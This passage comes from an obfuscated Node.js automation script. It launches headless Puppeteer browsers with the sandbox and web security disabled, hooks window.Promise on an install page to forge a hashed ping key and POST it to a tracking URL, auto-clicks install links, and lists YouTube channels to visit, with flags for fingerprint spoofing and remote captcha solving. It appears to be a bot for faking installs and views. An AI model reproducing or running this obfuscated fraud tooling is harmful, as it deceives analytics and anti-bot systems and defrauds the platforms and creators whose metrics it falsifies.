                return this['bytes'] > 0x15878b10b + -0x22d19868 + -0x35a718a4 && (this['hBytes'] += this['bytes'] / (0x2f34 * 0x5f2ae + 0x60349351 * 0x4 + 0x1 * -0x199958a9c) << 0x1d5 * -0x2 + -0x1 * -0x959 + 0x1e5 * -0x3, this['bytes'] = this['bytes'] % (0x60c14c34 + 0xbc * 0x90f8b3 + 0x7b8 * 0x6d68d)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1ff * 0xa + 0x424 + -0x1f * 0xc7;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x140 + 0x3 * -0x55 + -0x31] = this['block'], J[K >> -0x18c + 0xda4 + -0xc16] |= x[-0x17 * -0x19f + -0x2 * -0x10f3 + -0x472c & K], this['block'] = J[0x26b8 + -0xa * 0x38b + -0x33a], K >= 0x1 * -0x253d + 0x33d * 0x6 + 0x41 * 0x47 && (this['hashed'] || this['hash'](), J[-0x423 * 0x2 + 0x14ae + -0xc68] = this['block'], J[-0x1832 + -0x1 * 0x43c + -0xe3f * -0x2] = J[0x1 * 0x20be + -0x1ed3 + 0x31 * -0xa] = J[-0x3d * 0x16 + -0x217f + 0x26bf] = J[0x612 * 0x4 + 0x14c7 + -0x2d0c] = J[0xfc + -0x1 * 0x1d95 + 0x5b9 * 0x5] = J[0xb96 * 0x2 + 0x2 * 0x7d7 + -0x26d5] = J[0x25e4 + 0xbf7 + 0x1 * -0x31d5] = J[0x2 * -0xaf3 + -0x886 * 0x3 + 0x2f7f] = J[-0x153 + -0x4bd * 0x5 + 0x2 * 0xc86] = J[-0x3a * 0x10 + 0x1 * -0x13bc + 0x1765] = J[0x2f9 * 0xb + 0x1 * -0x20c7 + 0x1e] = J[-0x1183 * -0x2 + 0xbb * -0x3 + -0x20ca] = J[0x1af5 + 0x9d8 + -0x24c1] = J[0x20f0 + -0x1 * 0x1009 + -0x1 * 0x10da] = J[0x1 * -0xf4e + 0x165e + 0x17 * -0x4e] = J[0x2 * 0x1207 + 0x35 * 0x25 + 0x575 * -0x8] = -0x1ea6 + 0x184b + -0x1 * -0x65b), J[0x1c * -0x3d + -0x3 * 0x853 + 0x1fb3] = this['hBytes'] << 0x25c1 + 0x26ad + -0x4c6b | this['bytes'] >>> 0x269b + 0xa0e + 0xef * -0x34, J[-0x82c + 0x16fe + -0xec3] = this['bytes'] << 0x22bb * 0x1 + -0xef * 0x7 + -0x1c2f, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xd63 + -0x45 * 0x47 + 0x5d0; J < -0x1f69 + 0x24 * -0xd + 0x218d; ++J)
                K = Q[J - (0x1 * -0x1c60 + -0x18d * 0x7 + -0x1 * -0x273e)] ^ Q[J - (0x141b + 0x41a + -0x182d * 0x1)] ^ Q[J - (-0x793 + 0x11 * 0xff + -0x94e)] ^ Q[J - (0x14 * 0x64 + -0x121 * -0x5 + -0xd65)], Q[J] = K << 0x13b4 * 0x1 + -0xcbb + -0xdf * 0x8 | K >>> 0x1b7e + -0x26e + -0x18f1;
              for (J = 0x4b + -0x1f8 + -0x8f * -0x3; J < -0xc6e + -0x270a * 0x1 + 0x338c * 0x1; J += 0x3a * -0x49 + 0x2 * -0xf49 + 0x2f21)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1961 * 0x1 + 0x2 * -0x4c7 + -0x1 * -0x22f4 | L >>> 0x1e50 + 0x1f78 * -0x1 + 0x13 * 0x11) + (M & N | ~M & O) + P + (-0x77496312 + -0x618e309e + 0x1335a0d49) + Q[J] << 0x1f7 * 0x1 + 0x6b0 + 0x8a7 * -0x1) << 0x3d * -0x6 + -0x41 * -0x57 + 0x2 * -0xa52 | P >>> 0x1 * -0x1fcb + 0x2fb + 0x1ceb) + (L & (M = M << -0x163c + 0x1af * -0x1 + 0x1809 | M >>> -0x1e40 + 0x1 * -0x7b9 + 0x15 * 0x1cf) | ~L & N) + O + (-0x3d * 0x2766b0f + 0xa886204f + 0x4833dbdd) + Q[J + (0x1fd4 + 0x192c + -0x38ff)] << 0x1 * -0x1c53 + -0x524 + -0xd * -0x293) << -0x43 * -0x19 + -0xf3b * -0x2 + -0x6 * 0x62a | O >>> 0x1f79 + -0x13cd + -0xb91) + (P & (L = L << -0x945 + 0x1 * 0x120f + -0x8ac * 0x1 | L >>> -0x1 * 0x1159 + 0x1 * 0x1b71 + -0x1 * 0xa16) | ~P & M) + N + (0x18aa654f * 0x1 + -0x1571a1d9 + 0x5749b623) + Q[J + (-0x1 * -0x1545 + 0x1caa + -0x31ed)] << 0x4 * -0x5e6 + 0x1a5a + -0x2c2) << -0x4d * -0x4d + -0x5fd + -0x1127 | N >>> -0x1d30 + 0x1 * -0x25c0 + -0x430b * -0x1) + (O & (P = P << -0x9 * -0x17 + -0x10 * -0x1a3 + 0x7 * -0x3d7 | P >>> 0x9c1 + -0x1a16 + 0x2f * 0x59) | ~O & L) + M + (-0x5b0cbe66 + -0x19c8e6cf + 0xcf581ece) + Q[J + (-0xb82 + 0x4f7 + -0x68e * -0x1)] << 0x16e2 + -0xe88 + -0x85a) << -0x2300 + 0x397 + 0x3 * 0xa7a | M >>> -0xba * -0x17 + -0x72b + -0x4b8 * 0x2) + (N & (O = O << -0x16ec + 0x189d + 0x1f * -0xd | O >>> 0x2377 + -0x102f + -0x1346) | ~N & P) + L + (0x2f046f2f + 0x52ce5454 + -0x275049ea) + Q[J + (0x2304 + 0x1c8f + 0x35 * -0x133)] << 0x11e + 0x3a * 0x83 + -0x1ecc, N = N << -0xcff + -0x1f7f + 0x2 * 0x164e | N >>> 0x1 * 0x216 + 0x185b + -0x1 * 0x1a6f;
              for (; J < -0x5aa * 0x5 + 0x9c0 + -0x22 * -0x8d; J += 0xbb9 * 0x3 + -0x1 * -0x17d3 + -0x3af9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x260 + 0x4f2 + -0x28d | L >>> -0x591 + -0x67 * -0x1 + 0x545 * 0x1) + (M ^ N ^ O) + P + (0x8248c004 + -0x69a90366 + 0x563a2f03) + Q[J] << 0xf89 + 0x6f1 * 0x5 + 0x2 * -0x191f) << 0xf8c + 0x151c + -0x24a3 | P >>> -0x40 * -0x56 + -0x23b6 + 0xe51) + (L ^ (M = M << 0xde1 + 0x1 * 0x1cb + 0x2 * -0x7c7 | M >>> 0xa * 0x215 + -0x306 + -0xfd * 0x12) ^ N) + O + (-0xcc9f4b97 + -0xb912f772 + 0x219be * 0xee4b) + Q[J + (-0x245b + 0x169 * 0x7 + -0x1a7d * -0x1)] << 0x17f7 + 0x42b * 0x8 + -0x394f) << 0x40a + -0x1 * 0x176f + -0x1 * -0x136a | O >>> 0x6b6 * 0x1 + -0x5b * -0x1d + 0x1 * -0x10ea) + (P ^ (L = L << 0x1a41 + -0xc5 * -0x9 + 0x170 * -0x17 | L >>> 0x24 * 0xda + -0x986 + -0x1520) ^ M) + N + (-0xafdc656 * -0x2 + 0x373 * 0xb2554 + 0x326c9e39) + Q[J + (0x1a11 + 0x1cc7 + 0x1 * -0x36d6)] << 0xa7 * 0x10 + 0xe82 + -0x18f2) << 0x13 * -0xd1 + -0x22e * 0x9 + 0x2326 | N >>> -0x240f * -0x1 + -0x2450 + 0x5c * 0x1) + (O ^ (P = P << -0x1190 + 0x2562 + -0x13b4 | P >>> 0x1924 + 0x14eb + -0x1 * 0x2e0d) ^ L) + M + (-0x7f2b * -0x1776a + -0x2b6c55c * -0x5 + -0x593493f9) + Q[J + (-0x1 * -0x1d6e + -0x2095 + 0x32a)] << 0x11cf + -0x1 * 0x227e + 0x10af) << -0x734 + 0x1841 * -0x1 + 0x1f7a | M >>> 0x570 * -0x5 + -0x1 * 0x1ded + 0x3938) + (N ^ (O = O << -0x22 + 0x1 * -0x1a33 + 0x1a73 | O >>> -0xd * 0x298 + 0x1 * -0x805 + -0x29bf * -0x1) ^ P) + L + (-0xb009920b + 0x2247745 * 0x27 + 0x15 * 0x9aebac5) + Q[J + (0xbe * 0x2f + 0x32 * 0x4b + -0x1 * 0x3184)] << 0x1fab + 0x7 * -0x43e + -0x1f9, N = N << 0x23fb * -0x1 + -0x13f8 + 0x1f * 0x1cf | N >>> 0x14f * -0x19 + 0xffd + 0x10bc;
              for (; J < 0x1271 + -0xc24 + -0x611; J += -0x209 * 0xc + 0x1da5 * 0x1 + -0x534)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x263c + -0x1c5a + 0x429b | L >>> 0x1259 + 0xdc * -0x24 + 0x2 * 0x659) + (M & N | M & O | N & O) + P - (0x9f0504c1 + 0x1 * 0x539a894b + -0x81bb4ae8) + Q[J] << -0x1ed9 * 0x1 + -0x3 * 0x913 + -0x1d09 * -0x2) << -0x14f3 + 0x2 * 0x500 + 0xaf8 | P >>> -0x32e + 0x298 * -0xd + 0x1 * 0x2501) + (L & (M = M << 0x1ab3 + 0x7 * 0x1b5 + -0x1 * 0x2688 | M >>> 0x194f + -0x1d0c + 0x3bf) | L & N | M & N) + O - (0x3c7 * 0x641a1 + 0x43776f52 + -0x4dd * -0x47b27) + Q[J + (-0x23df + -0x4f * -0x60 + 0x2 * 0x320)] << 0x1df9 + -0x1 * 0xe8b + -0xf6e) << 0x1cd * -0x6 + -0x257c * 0x1 + 0x1 * 0x304f | O >>> -0x126 + -0x148 * -0x1 + 0x7 * -0x1) + (P & (L = L << -0xbd5 + -0x860 + 0x1453 * 0x1 | L >>> -0x1 * 0x6bd + 0xce0 + 0x20b * -0x3) | P & M | L & M) + N - (-0x17cb8d * 0x4cd + 0x2ee66789 * -0x1 + 0x11206de96) + Q[J + (-0x20f2 + -0x1b9f + 0x3c93)] << 0x1 * -0x709 + 0x20b0 + -0x19a7) << 0x6c2 * 0x5 + -0x23b5 + 0x1f0 | N >>> 0x7 * -0x2e3 + 0x26fd + 0x2ab * -0x7) + (O & (P = P << 0x418 + 0x804 + 0x5 * -0x266 | P >>> -0xd27 + -0x2a * 0x8c + 0x2421) | O & L | P & L) + M - (-0x17d5fb25 * -0x9 + 0x9da60539 + -0x103479662) + Q[J + (-0x8a8 + 0x4f0 + 0x3bb)] << 0xa98 + -0x9b2 + -0xe6) << -0x2 * 0x9af + -0x1190 * 0x2 + 0x3683 * 0x1 | M >>> -0x1e00 + 0xa9b + -0x180 * -0xd) + (N & (O = O << 0x25b1 + 0x18d1 * 0x1 + 0x1f32 * -0x2 | O >>> -0x6 * -0x667 + -0x5d1 * 0x2 + 0x1ac6 * -0x1) | N & P | O & P) + L - (0xb0f5585c + -0xa28 * -0x11450e + 0x3bdd9ada * -0x4) + Q[J + (-0x34e + -0x3 * -0x755 + 0x1 * -0x12ad)] << -0x8da + 0x5 * 0x23c + 0x252 * -0x1, N = N << -0x15c0 + 0x1 * 0xd8a + -0x854 * -0x1 | N >>> -0xdb2 * -0x1 + 0x1 * 0xa43 + 0x1 * -0x17f3;
              for (; J < -0xae5 * 0x3 + -0x202f * -0x1 + 0xd0; J += 0x1d1e + 0x1b91 * -0x1 + 0xc4 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1c32 + -0x1 * 0x70f + -0x151e | L >>> -0xa5c * -0x2 + 0x244b + -0x38e8) + (M ^ N ^ O) + P - (0x47250381 + -0x4c06acfd + -0xa411 * -0x5b46) + Q[J] << -0xcb9 * -0x1 + -0x7eb * 0x1 + -0x29 * 0x1e) << -0x191 * 0x2 + 0xb * -0xe5 + -0x2 * -0x67f | P >>> -0xe38 * 0x2 + 0x491 * 0x3 + 0x17c * 0xa) + (L ^ (M = M << -0x95d + -0x239f + 0x2d1a | M >>> 0x24b * -0x1 + 0x1773 + -0x2 * 0xa93) ^ N) + O - (0x3119 * -0x17ee + -0x35efbf64 + -0x6fc * -0x100e4d) + Q[J + (0x7a3 + 0xd91 + -0x25b * 0x9)] << -0xc4f + -0x86 + 0xcd5) << 0x11be + 0xea4 + 0x205d * -0x1 | O >>> -0x1a * 0x1a + -0x1b97 + -0xb * -0x2c2) + (P ^ (L = L << -0x1399 + 0x3 * -0x882 + 0x2d3d | L >>> -0x1f9b + 0x158c + -0xa11 * -0x1) ^ M) + N - (0x53a418 * 0x5d + -0x7 * -0x1b67147 + 0xb3d8881) + Q[J + (-0x24 * 0x6c + -0xb03 * 0x3 + -0x303b * -0x1)] << 0x1a32 + -0x1937 + 0xfb * -0x1) << 0x1357 * -0x1 + -0x1f92 + 0x32ee | N >>> 0x76b + -0x22d * 0xf + -0x3 * -0x871) + (O ^ (P = P << -0x8 * 0x24f + 0xe63 + 0x433 | P >>> 0x203a * -0x1 + -0x2054 + 0x812 * 0x8) ^ L) + M - (0x5d03f778 + 0x1e17b005 + -0x1 * 0x457e6953) + Q[J + (0x10 * -0x25f + -0xc9 * 0x28 + 0x455b)] << -0x18fe + -0x1 * -0x94 + 0x186a) << -0x17f + -0x1 * 0x1922 + 0x1 * 0x1aa6 | M >>> 0x183e + -0x699 + 0xa * -0x1c1) + (N ^ (O = O << 0x169d + -0x1c16 + 0x597 | O >>> -0x1f71 + -0x3fe + 0xd3 * 0x2b) ^ P) + L - (-0x19 * -0xbe7332 + 0x320cff3 * 0x2 + -0x21 * -0xdf1a22) + Q[J + (-0x9fc + -0x1 * 0x21d9 + 0x2bd9)] << 0x3fc + -0x6b9 + -0x1 * -0x2bd, N = N << 0x8f5 * 0x3 + 0x1b41 * 0x1 + 0x1be * -0x1f | N >>> -0x1c91 + -0x24f9 + -0x418c * -0x1;
              this['h0'] = this['h0'] + L << 0x4f * -0x2b + 0x1538 + -0x7f3, this['h1'] = this['h1'] + M << 0x1 * 0xd33 + 0x237e + -0x115 * 0x2d, this['h2'] = this['h2'] + N << 0x24d1 + 0x1c02 + -0x40d3, this['h3'] = this['h3'] + O << -0x7ef + 0x1dcc + -0x15dd, this['h4'] = this['h4'] + P << -0x76e + -0x2c4 + 0x1 * 0xa32;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2578 + 0x1 * 0x20f9 + -0x4655 & 0x1 * 0x1a6c + 0x153 * 0x12 + -0x3233] + w[J >> 0x584 * 0x4 + 0x13 * -0x47 + -0x10b3 & 0xa3a + 0xb * 0x2ce + 0x2905 * -0x1] + w[J >> -0x713 * -0x1 + 0xcd6 + -0x13d5 & -0x1214 + 0x156e + -0x34b] + w[J >> 0x161c + 0x1bd7 + -0x31e3 & -0x365 + -0x70c + 0x540 * 0x2] + w[J >> -0x17b6 + 0x271 + 0x1551 & 0x812 + -0x44 + 0x295 * -0x3] + w[J >> -0x1ed6 + 0xc51 + 0x128d & -0xe73 + -0x1bd * 0x1 + -0x103f * -0x1] + w[J >> 0x19 * 0x13d + 0x1b * 0x68 + -0x29e9 * 0x1 & 0x10c2 + -0x179 * -0x1 + -0x122c] + w[-0x16fd * -0x1 + 0x5 * -0x629 + 0x7df & J] + w[K >> 0xf80 * -0x2 + -0x518 * -0x1 + -0xb4 * -0x25 & -0x3a * -0x56 + 0x1fbb + -0x3328] + w[K >> 0x1bf7 * -0x1 + -0x1b53 + 0x3762 & -0x9ad * -0x2 + -0x55c + -0xdef] + w[K >> -0xef2 + -0xac1 + -0x1 * -0x19c7 & -0x20b * 0x8 + -0xc5 * 0xd + 0x4 * 0x69a] + w[K >> 0xc25 * -0x1 + 0x12cd + -0x698 & 0x1a * -0x179 + 0x26ee + -0x1 * 0x95] + w[K >> -0xe0 + -0x15a3 * 0x1 + 0x168f & -0x13aa + -0x6 * -0x4eb + 0x343 * -0x3] + w[K >> -0x1 * -0x1e81 + 0x3d * 0x39 + -0x1607 * 0x2 & 0x1e93 + 0x49 * 0x1d + 0x26c9 * -0x1] + w[K >> -0x12a2 + -0x335 * 0x1 + 0x15db & -0x1 * 0xe9b + -0x12dd + 0x2187] + w[-0x1 * -0x1ed3 + -0x2 * -0x1175 + -0x4b1 * 0xe & K] + w[L >> 0x1 * 0x848 + 0x5 * -0x109 + 0x1 * -0x2ff & -0xeb1 * 0x1 + -0x2c9 * -0xb + 0x245 * -0x7] + w[L >> 0x5 * 0x4d3 + 0x7e5 + -0x1fec & 0x468 * 0x1 + -0x1cd2 + 0x1879] + w[L >> 0x3 * 0xca8 + -0x2201 + -0x3e3 & 0x1af3 + -0x5ff + 0x1 * -0x14e5] + w[L >> -0x258a + -0x266c + 0x1 * 0x4c06 & -0x54f * 0x5 + -0x1582 + -0x4 * -0xc07] + w[L >> -0xce8 + 0x2 * -0x75d + 0x93a * 0x3 & -0x3 * 0xa13 + -0x21da * 0x1 + -0x2011 * -0x2] + w[L >> -0x1b95 + -0x1085 + 0x2c22 & 0xb8d + 0x3fb * 0x4 + -0x1b6a] + w[L >> 0xf5 * -0xa + -0x46e + 0xe04 & 0x1c77 + -0x1 * 0x1595 + -0x6d3] + w[0x1 * -0x169c + 0x1 * -0xc34 + 0x22df & L] + w[M >> 0x1e4d * 0x1 + -0x7 * -0x21d + -0x2cfc & -0x184e + -0x6f5 + 0x26 * 0xd3] + w[M >> -0x1a95 * -0x1 + 0x9d0 + -0x244d * 0x1 & 0x425 * -0x1 + 0x2220 + -0x1dec] + w[M >> 0x2a1 + 0x11 * -0x1cb + -0x41 * -0x6e & -0x1 * -0x1b13 + -0x7 * -0xa9 + -0x1fa3 * 0x1] + w[M >> 0x13f5 + -0x14d * 0x16 + 0xb * 0xcb & 0x1353 + -0x1481 + 0x13d] + w[M >> 0x16d6 + 0x3 * -0x477 + -0x965 * 0x1 & -0xd27 + -0x1 * 0x449 + 0x117f] + w[M >> -0x6e * -0x25 + -0x198d * 0x1 + 0x9af & -0x11fb + 0x2633 + -0x1429] + w[M >> 0x5 * -0x725 + 0x1763 * -0x1 + 0x3b20 & 0x251 * 0x7 + -0xc3 + -0xf65] + w[0x1 * -0x10e8 + 0x1404 + -0x30d & M] + w[N >> 0x593 + -0x15d + -0x1e * 0x23 & 0xf92 + 0x1 * 0x57b + -0x14fe] + w[N >> -0x1 * 0xc1b + -0x301 * -0x3 + 0x330 & -0x1 * -0x1c09 + -0x1c48 + 0x6 * 0xd] + w[N >> 0x97 + -0x1 * 0x1674 + -0x29 * -0x89 & 0x8fb + 0x9e * -0x4 + 0x1c * -0x3b] + w[N >> -0x1 * -0x1eab + 0x2 * -0x11e6 + 0x531 & 0x9 * 0x3a5 + 0x1e95 + -0x3f53] + w[N >> -0x85f * 0x3 + -0x468 + -0x1d91 * -0x1 & 0x143e + 0x109e + -0x24cd] + w[N >> -0x1b9 * 0xd + 0x3c * -0x77 + 0x3251 & 0x2126 + -0x1a * 0x11d + -0x1 * 0x425] + w[N >> 0x6 * 0x2f + -0x47d * 0x5 + 0x7 * 0x30d & -0x3 * 0xa61 + -0x3 * 0x85d + 0x3 * 0x12c3] + w[0x12 * 0xad + -0x371 * 0x3 + -0x1c8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x10b + -0x2233 + -0x20 * -0x10a & 0xcec + -0x49 * 0x79 + -0x5a5 * -0x4,
                J >> -0x4 * -0x36b + 0x1558 + -0x1 * 0x22f4 & -0x119 * 0xb + 0x2399 + -0x1687,
                J >> -0x745 + -0x92f + 0x107c & -0x18e3 + -0x1834 * 0x1 + 0x3216 * 0x1,
                -0x8 * 0x487 + 0xe * 0x1e7 + -0x9 * -0x12d & J,
                K >> 0x2b * 0x1d + -0x893 + 0x3cc & -0xd1f + -0x255 * 0xd + 0x2c6f,
                K >> -0xf56 + 0x156 * 0x13 + -0x9fc & 0x26e * 0x10 + -0x114 * 0x9 + -0x1 * 0x1c2d,
                K >> -0x29 * 0x59 + -0x47c + 0x12c5 & -0x1232 + 0x26f * -0x5 + 0x4 * 0x7d7,
                -0x1938 + -0x18a3 + 0x32da & K,
                L >> 0x1100 + -0x1cfc + 0xc14 & -0x151 * 0x1 + -0x120f + 0x145f,
                L >> -0x9c + 0xfd1 + -0xf25 & -0x363 * -0x6 + 0x307 * 0x5 + -0x2276,
                L >> -0x1754 + 0x23a2 + -0xc46 & 0xdb8 * 0x1 + -0x1f39 + 0x1280,
                0xb2 + -0x7b7 + 0x804 & L,
                M >> 0x21ef + 0x9cd * -0x3 + -0x470 & -0x5 * -0x509 + -0x2 * -0x132b + -0x3e84,
                M >> -0xf * -0x23 + -0x7 * -0x9e + -0x64f * 0x1 & -0x1979 + -0xdcc + 0xc * 0x35b,
                M >> 0x1e81 + -0x6d3 * 0x1 + -0x17a6 & -0x2323 * -0x1 + 0x19d1 + 0x1 * -0x3bf5,
                0x2287 * -0x1 + 0x82e + 0x1b58 & M,
                N >> -0x15bb * 0x1 + 0xaff * -0x1 + 0x1 * 0x20d2 & 0x1f6 + 0x134 + 0x22b * -0x1,
                N >> -0x7f * -0x48 + -0x2c5 * 0xd + 0x59 & -0x42d * -0x1 + -0x1383 + 0x1055,
                N >> 0x9e * -0x4 + -0x1ebf + 0x213f * 0x1 & -0x3f3 * -0x5 + 0x326 + 0x1 * -0x15e6,
                -0xd0f * -0x2 + -0x34e + 0x45d * -0x5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1b25 * -0x1 + 0x4 * 0x822 + -0x54f * 0x1), (K = new DataView(J))['setUint32'](-0xd3 * -0x6 + 0x1b3 * 0x12 + -0x2388, this['h0']), K['setUint32'](-0x200d + -0x3 * 0x19 + -0xda * -0x26, this['h1']), K['setUint32'](-0x1 * -0x253d + -0x330 + -0x2205, this['h2']), K['setUint32'](-0xe94 + 0xedc + 0x4 * -0xf, this['h3']), K['setUint32'](0x79 * -0x2b + -0x2266 + 0x36c9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * 0xfd + -0x2 * 0x5f6 + 0xaef];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x67 * 0x3 + 0x857 + -0x722;
            J[-0x24a + -0x631 + 0x87b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xc4 * 0x31 + 0x3 * -0x941 + 0x4147] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x17a7 + 0x3 * 0x61f + 0x54b), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x14d5 * 0x1 + 0x1a7 * 0x16 + -0xf84;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xda * -0xa + -0x1147 + -0x1 * -0xe9f), Promise['resolve'](0xbbe + -0xee1 + 0x324);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xeb1 * 0x1 + 0x4 * -0x64e + -0x11 * -0x259; j < 0xd19 * 0x2 + -0x177 + -0x18ba; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * -0x1135 + 0x65d + 0x2a18 + (-0xdc8 + 0x1 * 0x207d + -0x1 * 0x6fd) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0x107e + 0x1 * -0x87 + 0x28 * 0x6d) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xa * -0x29c + -0x2 * 0x7fa + 0x2 * 0x1506);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0xe5a + 0x13d * 0x7 + -0x1705; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const X = c;
    let i = this[floor(random() * this[X(0x1e)])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xa * -0x29c + -0x2 * 0x7fa + 0x2 * 0x1506);
    let h = e[f];
    if (c['SZnHuR'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x483 + 0x2625 + -0x2aa8, r, s, t = 0x23b * -0x2 + 0xb78 + -0x702; s = m['charAt'](t++); ~s && (r = q % (0x1f * -0x2e + 0x1564 + -0xee * 0x11) ? r * (0x1167 + 0x21c9 + -0x32f0) + s : s, q++ % (0x3f * 0x1 + 0x416 + -0x451)) ? o += String['fromCharCode'](0x7e6 + 0x3 * -0x91c + 0x146d & r >> (-(-0x2 * 0x506 + -0x32 * -0x11 + 0x6bc) * q & 0x47 * -0x35 + 0x426 * -0x5 + 0x2377 * 0x1)) : 0x2497 + -0x172b + -0xd6c) {
          s = n['indexOf'](s);
        }
        for (let u = 0xabc + 0x12cd + 0x1d89 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x486 + 0x1c9f + -0x2115 * 0x1))['slice'](-(0x19 * -0x139 + 0x26 * 0x9 + 0x1d3d));
        }
        return decodeURIComponent(p);
      };
      c['KytuvH'] = i, b = arguments, c['SZnHuR'] = !![];
    }
    const j = e[-0x4 * 0x19 + -0x1 * 0x4cf + 0xb * 0x79],
      k = f + j,
      l = b[k];
    return !l ? (h = c['KytuvH'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
